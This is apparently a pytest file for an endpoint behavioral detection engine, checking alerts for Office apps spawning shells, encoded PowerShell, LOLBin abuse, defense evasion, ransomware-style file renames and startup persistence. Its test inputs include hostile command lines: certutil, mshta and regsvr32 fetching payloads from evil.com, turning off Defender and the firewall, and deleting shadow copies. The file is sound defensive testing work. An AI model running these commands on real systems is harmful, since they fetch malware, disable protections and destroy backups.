"""
tests/test_behavior.py — Behavioral detection engine tests

Covers: parent-child anomaly, encoded PowerShell, LOLBin abuse,
defense evasion, mass file modification, credential access,
network anomaly, and startup persistence detection.
"""
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from scanner.behavior_engine import BehaviorEngine, BehaviorAlert


@pytest.fixture
def engine():
    return BehaviorEngine()


class TestParentChildAnomaly:
    def test_word_spawning_cmd(self, engine):
        alerts = engine.analyze_process({
            "pid": 1000, "name": "cmd.exe",
            "exe": r"C:\Windows\System32\cmd.exe",
            "cmdline": "cmd.exe /c whoami",
            "parent_name": "winword.exe",
        })
        assert any(a.rule_name == "ParentChildAnomaly" for a in alerts)

    def test_excel_spawning_powershell(self, engine):
        alerts = engine.analyze_process({
            "pid": 1001, "name": "powershell.exe",
            "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "cmdline": "powershell.exe -NoProfile",
            "parent_name": "excel.exe",
        })
        assert any(a.rule_name == "ParentChildAnomaly" for a in alerts)

    def test_normal_parent_child_no_alert(self, engine):
        alerts = engine.analyze_process({
            "pid": 1002, "name": "notepad.exe",
            "exe": r"C:\Windows\notepad.exe",
            "cmdline": "notepad.exe",
            "parent_name": "explorer.exe",
        })
        assert not any(a.rule_name == "ParentChildAnomaly" for a in alerts)


class TestEncodedPowerShell:
    def test_encoded_command(self, engine):
        alerts = engine.analyze_process({
            "pid": 2000, "name": "powershell.exe",
            "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "cmdline": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgA",
            "parent_name": "",
        })
        assert any(a.rule_name == "EncodedPowerShell" for a in alerts)

    def test_short_enc_flag(self, engine):
        alerts = engine.analyze_process({
            "pid": 2001, "name": "powershell.exe",
            "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "cmdline": "powershell.exe -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBz",
            "parent_name": "",
        })
        assert any(a.rule_name == "EncodedPowerShell" for a in alerts)

    def test_normal_powershell_no_alert(self, engine):
        alerts = engine.analyze_process({
            "pid": 2002, "name": "powershell.exe",
            "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "cmdline": "powershell.exe Get-Process",
            "parent_name": "",
        })
        assert not any(a.rule_name == "EncodedPowerShell" for a in alerts)


class TestLOLBinAbuse:
    def test_certutil_urlcache(self, engine):
        alerts = engine.analyze_process({
            "pid": 3000, "name": "certutil.exe",
            "exe": r"C:\Windows\System32\certutil.exe",
            "cmdline": "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
            "parent_name": "",
        })
        assert any(a.rule_name == "LOLBinAbuse" for a in alerts)

    def test_mshta_javascript(self, engine):
        alerts = engine.analyze_process({
            "pid": 3001, "name": "mshta.exe",
            "exe": r"C:\Windows\System32\mshta.exe",
            "cmdline": "mshta.exe javascript:a=GetObject('script:http://evil.com/s')",
            "parent_name": "",
        })
        assert any(a.rule_name == "LOLBinAbuse" for a in alerts)

    def test_regsvr32_scrobj(self, engine):
        alerts = engine.analyze_process({
            "pid": 3002, "name": "regsvr32.exe",
            "exe": r"C:\Windows\System32\regsvr32.exe",
            "cmdline": "regsvr32.exe /s /n /u /i:http://evil.com/f.sct scrobj.dll",
            "parent_name": "",
        })
        assert any(a.rule_name == "LOLBinAbuse" for a in alerts)

    def test_normal_certutil_no_alert(self, engine):
        alerts = engine.analyze_process({
            "pid": 3003, "name": "certutil.exe",
            "exe": r"C:\Windows\System32\certutil.exe",
            "cmdline": "certutil.exe -verify certificate.cer",
            "parent_name": "",
        })
        assert not any(a.rule_name == "LOLBinAbuse" for a in alerts)


class TestDefenseEvasion:
    def test_disable_defender(self, engine):
        alerts = engine.analyze_process({
            "pid": 4000, "name": "powershell.exe",
            "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "cmdline": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
            "parent_name": "",
        })
        assert any(a.rule_name == "DefenseEvasion" for a in alerts)

    def test_disable_firewall(self, engine):
        alerts = engine.analyze_process({
            "pid": 4001, "name": "cmd.exe",
            "exe": r"C:\Windows\System32\cmd.exe",
            "cmdline": "netsh advfirewall set allprofiles state off",
            "parent_name": "",
        })
        assert any(a.rule_name == "DefenseEvasion" for a in alerts)

    def test_delete_shadow_copies(self, engine):
        alerts = engine.analyze_process({
            "pid": 4002, "name": "cmd.exe",
            "exe": r"C:\Windows\System32\cmd.exe",
            "cmdline": "vssadmin delete shadows /all /quiet",
            "parent_name": "",
        })
        assert any(a.rule_name == "DefenseEvasion" for a in alerts)


class TestMassFileModification:
    def test_mass_modification_triggers(self, engine):
        for i in range(60):
            result = engine.check_file_ops(
                5000, "suspicious.exe", "modify", f"C:\\test\\file{i}.docx"
            )
        assert result is not None
        assert result.rule_name in ("MassFileModification", "RansomwareBehavior")

    def test_ransomware_rename_pattern(self, engine):
        result = None
        for i in range(60):
            result = engine.check_file_ops(
                5001, "crypto.exe", "rename", f"C:\\test\\file{i}.encrypted"
            )
        assert result is not None
        assert result.rule_name == "RansomwareBehavior"
        assert result.confidence >= 85

    def test_normal_file_ops_no_alert(self, engine):
        for i in range(5):
            result = engine.check_file_ops(
                5002, "notepad.exe", "modify", f"C:\\docs\\note{i}.txt"
            )
        assert result is None


class TestStartupPersistence:
    def test_temp_directory_startup(self, engine):
        alert = engine.check_startup_persistence(
            "Updater", r"C:\Users\test\AppData\Local\Temp\malware.exe",
            r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        )
        assert alert is not None
        assert alert.rule_name == "SuspiciousStartupPersistence"

    def test_encoded_startup_command(self, engine):
        alert = engine.check_startup_persistence(
            "Update", r"powershell.exe -enc SQBuAHYAbwBrAGUA",
            r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        )
        assert alert is not None
        assert alert.confidence >= 80

    def test_normal_startup_no_alert(self, engine):
        alert = engine.check_startup_persistence(
            "SecurityHealth",
            r"C:\Program Files\Windows Defender\MSASCuiL.exe",
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        )
        assert alert is None


class TestDeduplication:
    def test_same_alert_not_repeated(self, engine):
        for _ in range(3):
            engine.analyze_process({
                "pid": 9000, "name": "powershell.exe",
                "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "cmdline": "powershell.exe -EncodedCommand SQBuAHYA",
                "parent_name": "",
            })
        # LOLBinAbuse fires for powershell.exe with -EncodedCommand in LOLBin args
        lolbin = [a for a in engine.get_alerts()
                  if a["pid"] == 9000 and a["rule_name"] == "LOLBinAbuse"]
        assert len(lolbin) == 1
